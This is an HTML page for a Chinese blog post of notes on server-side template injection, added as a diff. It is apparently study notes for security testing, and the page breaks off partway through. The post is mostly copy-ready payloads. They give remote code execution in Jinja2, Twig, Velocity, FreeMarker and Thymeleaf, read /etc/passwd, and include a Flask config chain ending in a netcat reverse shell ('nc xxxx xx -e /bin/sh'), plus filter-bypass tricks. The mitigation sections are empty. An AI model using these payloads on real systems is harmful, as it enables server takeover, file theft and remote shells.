@@ -1,0 +1,839 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT" />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="SSTI一、概述SSTI(Server-Side-Template-Injection),全称 服务器端模板注入。是指攻击者能够利用原生模板语法向模板中注入恶意有效载荷，然后在服务器端执行。 模板引擎旨在通过将固定模板与易失性数据结合来生成网页。当用户输入直接连接到模板而不是作为数据传递时，可能会发生服务器端模板注入攻击。这使攻击者可以注入任意模板指令以操纵模板引擎，从而经常使攻击者能够完全控制服">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ssti的一些杂记">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2022&#x2F;02&#x2F;22&#x2F;ssti%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9D%82%E8%AE%B0&#x2F;index.html">
+<meta property="og:site_name" content="irrik&#39;s Blog">
+<meta property="og:description" content="SSTI一、概述SSTI(Server-Side-Template-Injection),全称 服务器端模板注入。是指攻击者能够利用原生模板语法向模板中注入恶意有效载荷，然后在服务器端执行。 模板引擎旨在通过将固定模板与易失性数据结合来生成网页。当用户输入直接连接到模板而不是作为数据传递时，可能会发生服务器端模板注入攻击。这使攻击者可以注入任意模板指令以操纵模板引擎，从而经常使攻击者能够完全控制服">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;12&#x2F;18&#x2F;1TwVl9UyF3iM8vR.png">
+<meta property="og:updated_time" content="2022-02-23T02:32:56.236Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;12&#x2F;18&#x2F;1TwVl9UyF3iM8vR.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2022/02/22/ssti的一些杂记/"/>
+
+
+
+
+
+  <title>ssti的一些杂记 | irrik's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">irrik's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">夏天要过去了</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2022/02/22/ssti%E7%9A%84%E4%B8%80%E4%BA%9B%E6%9D%82%E8%AE%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="irrik">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/11/10/UuWBRD8EjChrNIi.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="irrik's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">ssti的一些杂记</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-02-22T17:11:55+08:00">
+                2022-02-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  4.2k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  18
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h1><h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>SSTI(Server-Side-Template-Injection),全称 服务器端模板注入。是指攻击者能够利用原生模板语法向模板中注入恶意有效载荷，然后在服务器端执行。</p>
+<p>模板引擎旨在通过将固定模板与易失性数据结合来生成网页。当用户输入直接连接到模板而不是作为数据传递时，可能会发生服务器端模板注入攻击。这使攻击者可以注入任意模板指令以操纵模板引擎，从而经常使攻击者能够完全控制服务器。顾名思义，服务器端模板注入有效负载是在服务器端交付和评估的，这可能使它们比典型的客户端模板注入更加危险。<br>​        </p>
+<h2 id="二、攻击场景和范围"><a href="#二、攻击场景和范围" class="headerlink" title="二、攻击场景和范围"></a>二、攻击场景和范围</h2><p>服务器端模板注入漏洞会使网站受到各种攻击，这取决于相关模板引擎以及应用程序具体如何使用它。在某些罕见的情况下，这些漏洞不会构成真正的安全风险。然而，大多数情况下，服务器端模板注入的影响可能是灾难性的，可能导致了敏感信息泄露、代码执行、GetShell 等问题。<br>​</p>
+<h2 id="三、技术分析"><a href="#三、技术分析" class="headerlink" title="三、技术分析"></a>三、技术分析</h2><h3 id="模板语法分析"><a href="#模板语法分析" class="headerlink" title="模板语法分析"></a>模板语法分析</h3><p>SSTI利用成功的前提是语法要正确。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">以python的Jinja2模板为例，&#123;&#123;&#125;&#125;在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把&#123;&#123;&#125;&#125;包裹的内容当作变量来解析替换，&#123;&#123;256*256&#125;&#125;会被解析成65536.</span><br><span class="line">例如：</span><br><span class="line">from flask import Flask</span><br><span class="line">from flask import render_template</span><br><span class="line">from flask import request</span><br><span class="line">from flask import render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">@app.route(&apos;/test&apos;,methods=[&apos;GET&apos;, &apos;POST&apos;])</span><br><span class="line">def test():</span><br><span class="line">    template = &apos;&apos;&apos;</span><br><span class="line">        &lt;div class=&quot;center-content error&quot;&gt;</span><br><span class="line">        &lt;h1&gt;Oops! That page doesn&apos;t exist.&lt;/h1&gt;</span><br><span class="line">        &lt;h3&gt;%s&lt;/h3&gt;</span><br><span class="line">        &lt;/div&gt; </span><br><span class="line">    &apos;&apos;&apos; %(request.args.get(&apos;name&apos;))</span><br><span class="line">    return render_template_string(template)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    app.debug = True</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+
+<p>用户访问xxx/test?name=65536 会得到执行结果65536.</p>
+<p>各框架模板的语法在下图tags一栏：<br><img src="https://i.loli.net/2020/12/18/1TwVl9UyF3iM8vR.png" alt="1.png"></p>
+<h3 id="注入位置与类型分析"><a href="#注入位置与类型分析" class="headerlink" title="注入位置与类型分析"></a>注入位置与类型分析</h3><ol>
+<li>按照利用方式的不同可以分为利用模板本身特性构造payload，利用框架本身特性构造payload和利用开发语言本身特性构造payload</li>
+</ol>
+<ul>
+<li>利用模板本身特性。以Twig 1.x为例，_self在Twig框架中是一个特殊全局变量，会返回当前 \Twig\Template 实例，可以继续调用实例中的方法。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;whoami&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+可执行whoami命令</li>
+<li>利用开发语言本身特性。以python和Jinja2为例，通过利用python魔术方法构造利用链，最终实现命令执行。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__[&apos;popen&apos;](&apos;whoami&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+可执行命令whoami(由于python版本和安装的依赖不同，有可能需要手动调试payload)</li>
+<li>利用框架本身特性。以Flask/Jinja2为例，config 是Flask模版中的一个全局对象，它代表“当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值并且有一个from_pyfile方法。利用过程如下<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//写文件</span><br><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/tmp/evil&apos;, &apos;w&apos;).write(&apos;from os import system%0aSHELL = system&apos;) &#125;&#125;</span><br><span class="line">//加载system</span><br><span class="line">&#123;&#123; config.from_pyfile(&apos;/tmp/evil&apos;) &#125;&#125;</span><br><span class="line">//执行命令反弹SHELL</span><br><span class="line">&#123;&#123; config[&apos;SHELL&apos;](&apos;nc xxxx xx -e /bin/sh&apos;) &#125;&#125;</span><br></pre></td></tr></table></figure></li>
+</ul>
+<ol start="2">
+<li>按照payload执行结果可以分为正常回显和无回显<ul>
+<li>正常回显，攻击者可以直接在页面看到payload执行的结果。</li>
+<li>无回显，服务器端不返回payload执行的结果，或者攻击者无法根据返回结果判断攻击payload是否执行成功。<h3 id="常见绕过手法"><a href="#常见绕过手法" class="headerlink" title="常见绕过手法"></a>常见绕过手法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 字符拼接绕过正则/黑名单</span><br><span class="line">    - 以python为例，如果过滤了whoami,可以将`&#123;&#123;&apos;&apos;.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__[&apos;popen&apos;](&apos;whoami&apos;).read()&#125;&#125;`改为`&#123;&#123;&apos;&apos;.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__[&apos;popen&apos;](&apos;who&apos;+&apos;ami&apos;).read()&#125;&#125;`</span><br><span class="line">2. 模板原生函数绕过正则/黑名单</span><br><span class="line">    - 以python Jinja2为例，如果过滤了`.`号，可以使用原生 JinJa2 函数 |attr()代替，将`&#123;&#123;&quot;&quot;.__class__&#125;&#125;` 改成 `&#123;&#123;&quot;&quot;|attr(&quot;__class__&quot;)&#125;&#125;`</span><br></pre></td></tr></table></figure>
+<h2 id="四、攻击方法"><a href="#四、攻击方法" class="headerlink" title="四、攻击方法"></a>四、攻击方法</h2></li>
+</ul>
+</li>
+</ol>
+<h3 id="JAVA下SSTI注入攻击Velocity"><a href="#JAVA下SSTI注入攻击Velocity" class="headerlink" title="JAVA下SSTI注入攻击Velocity"></a>JAVA下SSTI注入攻击Velocity</h3><ol>
+<li>漏洞成因<br>攻击者利用模板本身特性构造一个可控的恶意payload，模板接收到攻击者恶意构造的payload进行解析，渲染，将攻击者恶意构造的payload执行。由此，攻击者可以在服务器上执行任意命令。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">VTL语句以`#`字符开头,后接一个指令。以`#set( $a = &quot;Velocity&quot; )`为例</span><br><span class="line">#字符后面是一个指令，set。set指令使用的是一个表达式（用括号括起来）--一个给变量赋值的公式。变量列在左手边，它的值列在右手边；两者之间用一个=字符隔开。</span><br><span class="line">在上面的例子中，变量是$a，值是Velocity。</span><br><span class="line">`ClassTool`：Velocity中用于在模板中使用Java反射的工具。默认键：`$class`。</span><br><span class="line">`$class.inspect(class/object/string)` 返回一个新的ClassTool实例来检查指定的类或对象。</span><br><span class="line">`$class.type` 返回被检查的实际类。</span><br><span class="line">可以将`$class.inspect`与`$class.type`进行链式连接，以获取对任意对象的引用，然后可以使用`Runtime.exec()`在目标系统上执行任意shell命令。</span><br><span class="line">假设T是任意的java类型，`T.class` 是java的语法，能得到一个`Class`类型的实例，`forName(String)`是`Class`类的静态方法，能得到类名对应的Class对象。</span><br></pre></td></tr></table></figure></li>
+<li>测试用例<br>读文件<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#set($x=&apos;&apos;)</span><br><span class="line">#set($rt=$x.class.forName(&apos;java.lang.Runtime&apos;))</span><br><span class="line">#set($chr=$x.class.forName(&apos;java.lang.Character&apos;))</span><br><span class="line">#set($str=$x.class.forName(&apos;java.lang.String&apos;))</span><br><span class="line"></span><br><span class="line">#set($ex=$rt.getRuntime().exec(&apos;cat /etc/passwd&apos;))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br><span class="line"></span><br><span class="line">执行命令</span><br><span class="line"></span><br><span class="line">#set($x=&apos;&apos;)</span><br><span class="line">#set($rt=$x.class.forName(&apos;java.lang.Runtime&apos;))</span><br><span class="line">#set($chr=$x.class.forName(&apos;java.lang.Character&apos;))</span><br><span class="line">#set($str=$x.class.forName(&apos;java.lang.String&apos;))</span><br><span class="line"></span><br><span class="line">#set($ex=$rt.getRuntime().exec(&apos;whoami&apos;))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end</span><br></pre></td></tr></table></figure>
+(要执行其他命令可修改exec()中的命令内容)</li>
+<li>测试结果</li>
+<li>缓解措施</li>
+</ol>
+<h3 id="JAVA下SSTI注入攻击FreeMarker"><a href="#JAVA下SSTI注入攻击FreeMarker" class="headerlink" title="JAVA下SSTI注入攻击FreeMarker"></a>JAVA下SSTI注入攻击FreeMarker</h3><ol>
+<li>漏洞成因<br>攻击者利用模板本身特性进行攻击。<code>Configuration.setNewBuiltinClassResolver</code>是FreeMarker内置的设置。这允许你指定新的内置（例如 “com.example.SomeClass”?new()）如何解析类，以及哪些类是完全可以访问的。虽然new不会实例化不实现TemplateModel的类，但FreeMarker包含一个TemplateModel类，可以用来创建任意的Java对象。查看文档找到实现了TemppateModel接口的类-<code>Execute</code>，<code>Execute</code>给予FreeMarker<strong>执行外部命令的能力。将fork一个进程，并在模板中内联该进程发送的任何东西到标准输出。</strong><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`&lt;#assign&gt;`是FreeMarker的赋值表达式，将freemarker.template.utility.Execute和内置设置相结合，再赋值给变量，即可通过变量实现命令执行。</span><br></pre></td></tr></table></figure></li>
+<li>测试用例<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">`$&#123;256*256&#125;`</span><br><span class="line">`&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;whoami&quot;) &#125;`</span><br><span class="line">`&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;cat /etc/passwd&quot;) &#125;`</span><br><span class="line">针对不同环境的不同语法，也有以下两个payload可供尝试</span><br><span class="line">`[#assign ex = &apos;freemarker.template.utility.Execute&apos;?new()]$&#123; ex(&apos;whoami&apos;)&#125;`</span><br><span class="line">`[#assign ex = &apos;freemarker.template.utility.Execute&apos;?new()]$&#123; ex(&apos;cat /etc/passwd&apos;)&#125;`</span><br></pre></td></tr></table></figure></li>
+<li>测试结果</li>
+<li>缓解措施</li>
+</ol>
+<h3 id="JAVA下SSTI注入攻击Spring-View-manipulation-以Thymeleaf为例"><a href="#JAVA下SSTI注入攻击Spring-View-manipulation-以Thymeleaf为例" class="headerlink" title="JAVA下SSTI注入攻击Spring View manipulation (以Thymeleaf为例)"></a>JAVA下SSTI注入攻击Spring View manipulation (以Thymeleaf为例)</h3><ol>
+<li><p>漏洞成因<br>在从文件系统加载模板之前，Spring ThymeleafView类将模板名称解析为一个表达式。<br>举个例子</p>
+<p> @GetMapping(“/path”)<br> public String path(@RequestParam String lang) { </p>
+<pre><code>return &quot;user/&quot; + lang + &quot;/welcome&quot;; //template path is tainted</code></pre><p> }</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">lang是一个参数并且用户可控，Spring ThymeleafView类会将参数`lang`解析成为一个模板的表达式，由此产生ssti漏洞。</span><br><span class="line">攻击者构造`xxx.com/path?lang=payload`可进行ssti攻击。</span><br><span class="line">`$&#123;...&#125;`: Thymeleaf的变量表达式--**实际上，这些都是OGNL或Spring EL表达式**,在SpEL中，特殊的T操作符可以用T(类名)来指定类java.lang.Class的实例。举个例子，T(java.lang.String)相当于java中的String.class。静态方法也可以使用这个操作符来调用。而java.lang.Runtime的getRuntime()恰好是一个静态方法，这个方法返回一个Runtime实例，进而调用类Runtime的exec方法执行命令。</span><br><span class="line">`__$&#123;...&#125;__::.x`是thymeleaf的表达式预处理语法，放在双下划线`__...__`之间的表达式会被预处理，预处理的结果会在正则处理过程中作为表达式的一部分使用。</span><br><span class="line">通过用`__$&#123;&#125;__::.x`包围表达式确保它会被thymeleaf执行。</span><br></pre></td></tr></table></figure></li>
+<li><p>测试用例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">需要对payload中的花括号进行url编码否则会报400</span><br><span class="line">`__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).nextLine()%7d__::.x`  这个payload只能读取执行结果的一行</span><br></pre></td></tr></table></figure>
+<p>命令执行的输出混杂在报错信息的<strong>中括号</strong>中，形如</p>
+</li>
+</ol>
+<p>There was an unexpected error (type=Internal Server Error, status=500).<br>Error resolving template [user/irrik\irrik], template might not exist or might not be accessible by any of the configured Template Resolvers</p>
+<p>其中<code>irrik\irrik</code>为本地测试whoami命令执行结果<br>3. 测试结果<br>4. 缓解措施</p>
+<h3 id="PYTHON下jinja2"><a href="#PYTHON下jinja2" class="headerlink" title="PYTHON下jinja2"></a>PYTHON下jinja2</h3><ol>
+<li>漏洞成因<br>Jinja2是Flask框架的一部分。Jinja2会把模板参数提供的相应的值替换了 <code></code> 块。由于在jinja2中是可以直接访问python的一些对象及其方法的，所以可以通过构造继承链来执行一些操作。攻击者利用开发语言特性，在存在漏洞的点利用python的特性，从魔术方法中寻找到所需函数，最终实现文件读取，命令执行。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">`__class__`　　：返回一个实例所属的类通过从子类寻找基类，</span><br><span class="line">`__mro__`　　  ：返回一个包含对象所继承的基类元组，</span><br><span class="line">`__bases__`　　：以元组形式返回一个类直接所继承的类（可以理解为直接父类）方法在解析时按照元组的顺序解析。</span><br><span class="line">`__subclasses__`　　：以列表返回类的子类</span><br><span class="line">`__init__`　　 ：类的初始化方法</span><br><span class="line">`__globals__`　　   ：对包含函数全局变量的字典的引用</span><br><span class="line">`__builtin__&amp;&amp;__builtins__`　　：python中可以直接运行一些函数，例如eval()</span><br></pre></td></tr></table></figure></li>
+<li>测试用例<br>python3<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">`&#123;&#123;256*256&#125;&#125;`</span><br><span class="line">`&#123;&#123;config.items()&#125;&#125;`</span><br><span class="line">`&#123;&#123;&apos;&apos;.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__[&apos;popen&apos;](&apos;cat /etc/passwd&apos;).read()&#125;&#125;`</span><br><span class="line">`&#123;&#123;&apos;&apos;.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__[&apos;popen&apos;](&apos;whoami&apos;).read()&#125;&#125;`</span><br><span class="line">`&#123;&#123; &apos;&apos;.__class__.__mro__[1].__subclasses__()[138].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&apos;)&#125;&#125;`</span><br></pre></td></tr></table></figure>
+最后是这个自动适应版本的payload，会自动根据python版本搜索对应的函数执行命令，要改变执行的命令，请修改whoami部分为其它命令。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &apos;eval&apos; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&apos;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">(本地测试环境为python3.8.5，根据python版本的不同也许需要手动调整测试用例，通用payload可无视python版本。`&apos;&apos;.__class__.__mro__[1].__subclasses__()[138]` 为 `&lt;class &apos;os._wrap_close&apos;&gt;`)</span><br><span class="line">python2</span><br><span class="line">`&#123;&#123;256*256&#125;&#125;`</span><br><span class="line">`&#123;&#123;config.items()&#125;&#125;`</span><br><span class="line">`&#123;&#123;[].__class__.__bases__[0].__subclasses__()[40](&apos;/etc/passwd&apos;).read()&#125;&#125;`</span><br><span class="line">`&#123;&#123;().__class__.__bases__[0].__subclasses__()[72].__init__.__globals__[&apos;os&apos;].system(&apos;whoami&apos;)&#125;&#125;` 注意这个命令不会返回结果，只返回状态码(0或者1)，0表示成功执行，1表示执行出错或者失败。</span><br><span class="line">`&#123;&#123;[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;eval&apos;](&quot;__import__(&apos;os&apos;).popen(&apos;whoami&apos;).read()&quot;)&#125;&#125;`</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<p>最后是这个自动适应版本的payload，会自动根据python版本搜索对应的函数执行命令，要改变执行的命令，请修改whoami部分为其它命令。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &apos;eval&apos; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;whoami&quot;).read()&apos;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line">(本地测试环境为python2.7.16，根据python版本的不同也许需要手动调整测试用例，通用payload可无视python版本。</span><br><span class="line"></span><br><span 